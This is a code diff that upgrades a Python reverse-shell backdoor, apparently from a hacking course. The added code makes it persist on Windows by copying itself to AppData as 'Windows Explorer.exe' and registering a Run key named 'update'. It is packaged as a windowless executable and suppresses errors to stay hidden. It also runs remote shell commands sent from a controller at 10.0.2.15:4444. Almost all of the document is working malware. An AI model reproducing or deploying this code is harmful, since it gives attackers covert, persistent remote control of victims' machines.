@@ -1,18 +1,34 @@
 #!/usr/bin/env python
 
 # This application needs to run from the target machine
+# -------------------------------------UPDATE-------------------------------------
+# This application is meant to run as an executable from the target machine
+# To do so, you must have installed the python for the same OS as the target machine
+# Install PyInstaller with pip: python -m pip pyinstaller
+# Create the executable file:   python -m PyInstaller <file>.py --onefile --noconsole
+# The executable that needs to run from target machine is located in created dist directory
 
 import socket      # a way of connecting two nodes on a network to communicate with each other.
 import subprocess  # function for shell commands
 import json        # a lightweight data interchange format
 import os          # manipulate paths
 import base64      # functions for encoding binary data to printable ASCII characters and decoding such encodings back to binary data
-
+import sys         # provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter
+import shutil      # copy the content of source file to destination file or directory
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a socket object
         self.connection.connect((ip, port))                                  # connect to specified ip/port
+
+    # function that copies the executable file to a specific path and makes it run on startup of system
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"   # set the location to copy file in the AppFile directory under the name Windows Explorer.exe
+        if not os.path.exists(evil_file_location):                              # if path doesnt already exist
+            shutil.copyfile(sys.executable, evil_file_location)                 # copy current file to file location
+            # add this executable on system startup
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     # function that sends json objects through socket connection
     def reliable_send(self, data):
@@ -35,7 +51,7 @@ class Backdoor:
                 continue
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -57,7 +73,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
@@ -71,6 +87,8 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-
-my_backdoor = Backdoor("10.0.2.15", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("10.0.2.15", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
